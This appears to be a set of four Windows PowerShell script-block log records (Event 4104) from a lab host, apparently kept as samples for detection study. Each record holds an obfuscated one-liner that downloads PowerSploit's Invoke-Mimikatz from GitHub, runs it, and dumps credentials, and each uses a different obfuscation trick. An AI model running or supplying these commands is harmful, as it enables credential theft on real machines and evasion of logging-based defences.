{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:25:04.174349Z"},"EventRecordID":710848,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-5591-74CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"(('IEX ('+'New'+'-Object'+' Net.Web'+'Client'+')'+'.DownloadString(oH'+'4http'+'s:'+'//raw'+'.g'+'it'+'hubuse'+'rcontent.c'+'om/m'+'at'+'tifes'+'t'+'a'+'tion/'+'Po'+'we'+'rSploit/ma'+'s'+'ter/Exfiltra'+'tion'+'/I'+'nvoke-Mimikat'+'z.ps1oH4'+'); Invoke-Mimi'+'katz -Du'+'mpCred'+'s') -REpLacE ([cHaR]111+[cHaR]72+[cHaR]52),[cHaR]39)| IEx","ScriptBlockId":"e60123ac-d637-4827-be60-3ed55801733d","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:25:20.783764Z"},"EventRecordID":714840,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-34F3-74CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":" (((\"{41}{32}{44}{45}{20}{36}{35}{21}{10}{40}{29}{42}{26}{28}{1}{19}{15}{11}{48}{49}{39}{30}{4}{18}{47}{31}{24}{23}{33}{43}{12}{13}{7}{8}{22}{46}{14}{27}{25}{5}{0}{34}{6}{16}{17}{38}{3}{9}{2}{37}\" -f'1','ubuserco','Dump','tz ','festati','atz.ps','); In','s','t','-','p','m/','/','ma','ion/I','co','vok','e-M','on','ntent.','load','t','er','l','p','e-Mimik','.','nvok','gith',':','ti','rS',' (New-','o','{0}','t','String({0}h','Creds','imika','t','s','IEX','//raw','it','Object Net.WebCli','ent).Down','/Exfiltrat','/Powe','m','a')) -F  [ChaR]39) | . ( $ShelliD[1]+$sHELliD[13]+'X')","ScriptBlockId":"bb0f3023-f07e-45c6-9387-f16cb50abfc4","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:25:48.631790Z"},"EventRecordID":719151,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-76CA-74CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"$l7i= \" ))93]RaHc[ f-  )'sderCpmuD-'+' ztak'+'imi'+'M'+'-e'+'kovnI'+' '+';)}0{'+'1sp.'+'ztaki'+'mi'+'M-ekovnI/no'+'i'+'ta'+'rtl'+'ifx'+'E/'+'retsa'+'m/'+'tiolpSrewoP'+'/no'+'itats'+'e'+'fitt'+'am'+'/moc'+'.tne'+'tn'+'o'+'cresu'+'buhtig'+'.war//:sptth}0{(gn'+'ir'+'tSdaol'+'n'+'woD.)'+'tne'+'ilCb'+'eW.t'+'eN t'+'c'+'ejbO-w'+'eN('+' X'+'EI'(( ( )'x'+]03[emoHSP$+]12[EmOHsp$ ( &  \";  ( cHiLDiTEm  (\"vAr\"+\"iaBlE\"+\":\"+\"l7I\")).vaLuE[-1 ..-(( cHiLDiTEm  (\"vAr\"+\"iaBlE\"+\":\"+\"l7I\")).vaLuE.lengTh)]-JOIN''|& ( ([StRiNg]$VERbOsePREferENCe)[1,3]+'X'-join'')","ScriptBlockId":"a31e25d3-0a71-417c-8c45-2ff73f1ba0b0","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:25:48.647009Z"},"EventRecordID":719154,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-79CA-74CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"  & ( $psHOmE[21]+$PSHome[30]+'x') ( (('IE'+'X '+'(Ne'+'w-Obje'+'c'+'t Ne'+'t.We'+'bCli'+'ent'+').Dow'+'n'+'loadSt'+'ri'+'ng({0}https://raw.'+'github'+'userc'+'o'+'nt'+'ent.'+'com/'+'ma'+'ttif'+'e'+'stati'+'on/'+'PowerSploit'+'/m'+'aster'+'/E'+'xfi'+'ltr'+'at'+'i'+'on/Invoke-M'+'im'+'ikatz'+'.ps1'+'{0});'+' '+'Invok'+'e-'+'M'+'imi'+'katz '+'-DumpCreds')  -f [cHaR]39)) ","ScriptBlockId":"12010bcf-b8ee-4983-b4f6-136798cd0b33","Path":""}}}
